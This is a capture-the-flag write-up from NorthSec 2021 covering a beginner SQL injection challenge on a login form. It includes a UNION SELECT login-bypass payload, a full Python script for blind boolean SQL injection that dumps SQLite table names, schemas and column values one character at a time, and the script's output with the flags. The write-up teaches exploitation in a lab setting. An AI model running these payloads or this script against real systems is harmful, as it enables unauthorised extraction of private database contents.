---
layout: post
title: NorthSec 2021 Writeup - Wizard Hackademy - SpellQueryLanguage
date: 2021-05-24
type: post
tags:
- Writeup
- Hacking
- Northsec
- CTF
permalink: /2021/05/NorthSec2021WriteupSpellQueryLanguage/
---

This [SQL Injection](https://en.wikipedia.org/wiki/SQL_injection) challenge of the beginer's track at the [NorthSec2021 CTF](https://nsec.io/competition/) had two flags. 

I didn't take screenshots, but the challenge displayed a login form that was vulnerable to SQL Injection.

## Flag 2
Some of my teammates were able to exploit the injection and get the second flag. It was a simple injection, they used `admin123' UNION SELECT 'admin', '', '' -- -` as the username and no password. The site gave them the first flag and told them that another flag was hidden in the database. 

Flag 2: FLAG-eada3adddb148d5e9ed1b18a91d06a90

## Flag 1

My teammates asked me to help them extract the first flag from the database. I tried obvious things like reading from a flag table, but that was not it. 

At this point I could have used [sqlmap](https://sqlmap.org/) to dump the content of the database. But I tough the challenge might have been designed in a way that prevented it. It would have been smart to try it, but I'm clearly not that smart. And anyway what's the fun in letting a tool do all the work? 

So I wrote my own script to exploit the SQL Injection from the login screen. I found ways to interrogate the database. I made usernames that would return me the second flag if the answer to my question was true, and an error in it was false. 

I then wrote the script that would extract the following information one piece at the time:
* The number of tables in the database
* The name of those tables
* The columns in the tables
* The data in one column of a table

This script generated lots of requests to the server. I was afraid we might get a warning for brute forcing, but apparently it was not an issue.

The script had a little bug. It found '(' where there was a space. But I got too lazy to fix it. And the output was easy to read even with the bug.

I ran the script and extracted all that information. Turned out the first flag was in the column `apprentice_flag` of the table `fl4G_1s_H3re`. 

Here's the output from running the script. 

```bash
$ python3 dumpDb.py getTablesInDatabase
Extracting the tables in database

Found 2 tables in the database

The table at offset 0 is 12 caracters long
Found table:
fl4G_1s_H3re

The table at offset 1 is 5 caracters long
Found table:
users

$ python3 dumpDb.py getTableStructure fl4G_1s_H3re
Extracting the table structure for table fl4G_1s_H3re

The sql for table fl4G_1s_H3re is 57 chars long

CREATE(TABLE(fl4G_1s_H3re((apprentice_flag(TEXT(NOT(NULL)

$ python3 dumpDb.py getDataFromTable fl4G_1s_H3re apprentice_flag

Getting the data from fl4G_1s_H3re ['apprentice_flag']
Found 1 rows in fl4G_1s_H3re
Extracting row 0
The value is 123 chars long
  
Extracted Value:
FLAG-f8988c759fd52fb3f42e7a6e65d0bce0((1/2).(If(you(don(t(already(have,(try(to(bypass(the(login((still(with(the(injection).

```

And here's the script I built for dumping the database. 

```python
#!/usr/bin/env python3

import sys
import requests
import math

CHALLENGE_URL = "http://chal4.wizard-hackademy.ctf"
MIN_COUNT = 1
MAX_COUNT = 200
ASCII_MIN = 32
ASCII_MAX = 256

TABLE_COUNT_QUESTION = "admin123' UNION SELECT '', '', CASE when COUNT() = VAR_VALUE then '' else 'BAD' END FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%' ORDER BY 1 -- -"
TABLE_NAME_LENGTH_QUESTION = "admin123' UNION SELECT '', name, CASE when length(name) = VAR_VALUE then '' else 'BAD' END FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%' ORDER BY name LIMIT 1 OFFSET VAR_OFFSET -- -"
TABLE_NAME_QUESTION = "admin123' UNION SELECT '', name, CASE when substr(name, VAR_POSITION, 1) <= 'VAR_VALUE' then '' else 'BAD' END FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%' ORDER BY name LIMIT 1 OFFSET VAR_OFFSET -- -"

TABLE_STRUCTURE_LENGTH_QUESTION = "admin123' UNION SELECT '', '', CASE when length(sql) = VAR_VALUE then '' else 'BAD' END FROM sqlite_master WHERE type = 'table' AND name = 'VAR_TABLE_NAME' -- -"
TABLE_STRUCTURE_QUESTION = "admin123' UNION SELECT '', '', CASE when substr(sql, VAR_POSITION, 1) <= 'VAR_VALUE' then '' else 'BAD' END FROM sqlite_master WHERE type = 'table' AND name = 'VAR_TABLE_NAME' -- -"

ROWS_IN_TABLE_COUNT_QUESTION = "admin123' UNION SELECT '', '', CASE when COUNT() = VAR_VALUE then '' else 'BAD' END FROM VAR_TABLE_NAME -- -"

VALUE_LENGTH_QUESTION = "admin123' UNION SELECT '', VAR_COLUMN_NAME, CASE when length(VAR_COLUMN_NAME) = VAR_VALUE then '' else 'BAD' END FROM VAR_TABLE_NAME ORDER BY VAR_COLUMN_NAME LIMIT 1 OFFSET VAR_OFFSET -- -"
VALUE_QUESTION = "admin123' UNION SELECT '', VAR_COLUMN_NAME, CASE when substr(VAR_COLUMN_NAME, VAR_POSITION, 1) <= 'VAR_VALUE' then '' else 'BAD' END FROM VAR_TABLE_NAME ORDER BY VAR_COLUMN_NAME LIMIT 1 OFFSET VAR_OFFSET -- -"

def main(argv):
    if len(argv) < 2:
        print("Usage: {0} action parameter...".format(argv[0]))
        print("action is one of: ")
        print("     getTablesInDatabase")
        print("     getTableStructure")
        print("     getDataFromTable")

        print("")
        return
    
    action = argv[1]

    if "getTablesInDatabase" == action:
        getTablesInDatabaseAction(argv)
        return


    if "getTableStructure" == action:
        getTableStructureAction(argv)
        return

    if "getDataFromTable" == action:
        getDataFromTableAction(argv)
        return

    raise Exception('Invalid action {0}'.format(action))

# Actions

def getTablesInDatabaseAction(argv):
    return extractTableNames()

def getTableStructureAction(argv):
    if len(argv) != 3:
        print("Usage: {0} getTableStructure tableName".format(argv[0]))
        return

    tableName = argv[2]

    return extractTableStructure(tableName)

def getDataFromTableAction(argv):
    if len(argv) < 4:
        print("Usage: {0} getDataFromTable tableName columnName".format(argv[0]))
        return

    tableName = argv[2]
    columns = [argv[3]]

    extraDataFromTable(tableName, columns)

# Tables Fuctions
def extractTableNames():
    print("Extracting the tables in database\n")

    numberOfTables = getTableCount()
    print("Found {0} tables in the database\n".format(numberOfTables))

    tables = []
    for i in range(0, numberOfTables):
        tableName = getTableNameAtOffset(i)
        tables.append(tableName)
    
    return tables

def getTableCount():
    return countInDatabase(TABLE_COUNT_QUESTION)

def getTableNameAtOffset(offset):
    tableNameLength = getLengthTableNameAtOffset(offset)
    print("The table at offset {0} is {1} caracters long".format(offset, tableNameLength))

    query = replaceVariables(TABLE_NAME_QUESTION, {"VAR_OFFSET": str(offset)})
    tableName = readValueFromDatabase(query, tableNameLength)
    print("Found table:\n{0}\n".format(tableName))

    return tableName


def getLengthTableNameAtOffset(offset):
    query = replaceVariables(TABLE_NAME_LENGTH_QUESTION, {"VAR_OFFSET": str(offset)})
    return countInDatabase(query)

# Columns Functions
def extractTableStructure(tableName):
    print("Extracting the table structure for table {0}\n".format(tableName))

    sqlLength = getLengthOfTableSql(tableName)
    print("The sql for table {0} is {1} chars long\n".format(tableName, sqlLength))

    query = replaceVariables(TABLE_STRUCTURE_QUESTION, {"VAR_TABLE_NAME": tableName})
    tableStructure = readValueFromDatabase(query, sqlLength)
    print(tableStructure)
    return tableStructure

def getLengthOfTableSql(tableName):
    query = replaceVariables(TABLE_STRUCTURE_LENGTH_QUESTION, {"VAR_TABLE_NAME": tableName})
    return countInDatabase(query)


# Table Data Functions
def extraDataFromTable(tableName, columns):
    print("\nGetting the data from {0} {1}".format(tableName, columns))

    numberOfRows = countRowsInTable(tableName)
    print("Found {0} rows in {1}".format(numberOfRows, tableName))

    for offset in range(0, numberOfRows):
        extractRowFromTable(tableName, offset, columns)

def countRowsInTable(tableName):
    queryWithNames = replaceVariables(ROWS_IN_TABLE_COUNT_QUESTION, {'VAR_TABLE_NAME': tableName})
    return countInDatabase(queryWithNames)

def extractRowFromTable(tableName, offset, columns):
    print("Extracting row {0}".format(offset))

    for column in columns:
        extractDataFromColumn(tableName, offset, column)

def extractDataFromColumn(tableName, offset, column):
    valueLength = getLengthOfDataAtOffset(tableName, offset, column)
    print("The value is {0} chars long".format(valueLength))

    query = replaceVariables(VALUE_QUESTION, {'VAR_COLUMN_NAME': column, "VAR_TABLE_NAME": tableName, "VAR_OFFSET": str(offset)})
    value = readValueFromDatabase(query, valueLength)
    print("\nExtracted Value:\n{0}\n\n".format(value))

    return value

def getLengthOfDataAtOffset(tableName, offset, column):
    queryWithNames = replaceVariables(VALUE_LENGTH_QUESTION, {'VAR_COLUMN_NAME': column, 'VAR_TABLE_NAME': tableName, 'VAR_OFFSET': str(offset)})
    return countInDatabase(queryWithNames)

# Helpers
def readValueFromDatabase(query, valueLength):
    name = ""
    for i in range(1, valueLength + 1):
        name += getCharAtPosition(query, i)
        #print(name)

    return name

def getCharAtPosition(getCharQuery, position):
    min = ASCII_MIN
    max = ASCII_MAX

    while True:
        index = math.floor((min + max) / 2)
        #print("Try {0} - {1} - {2}".format(min, index, max))
        #print(chr(index))
        isTrue = isCharAtPositionSmallerOrEqualThen(getCharQuery, position, index)

        if isTrue:
            max = index
        else:
            min = index + 1

        if (min == max):
            return chr(min)
        if (min > max):
            return chr(index)

def isCharAtPositionSmallerOrEqualThen(getCharQuery, position, valueToCheck):
    query = replaceVariables(getCharQuery, {"VAR_VALUE": chr(valueToCheck), "VAR_POSITION": str(position)})
    return isQueryTrue(query)

def countInDatabase(countQuery):
    for i in range(MIN_COUNT, MAX_COUNT):
        query = replaceVariables(countQuery, {"VAR_VALUE": str(i)})
        if (isQueryTrue(query)):
            return i

    raise Exception('Unable to count with the query\n{0}\n'.format(countQuery))

def isQueryTrue(query): 
    #print(query)
    data = {"username": query, "password": "", "login": "login"}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    response = requests.post(CHALLENGE_URL, data=data, headers=headers)

    return "You have successfully logged in" in response.text

def replaceVariables(query, variables):
    modifiedQuery = query
    for toReplace in variables: 
        modifiedQuery = modifiedQuery.replace(toReplace, variables[toReplace])

    return modifiedQuery


if __name__ == '__main__':
    main(sys.argv)
```

Flag 1: FLAG-f8988c759fd52fb3f42e7a6e65d0bce0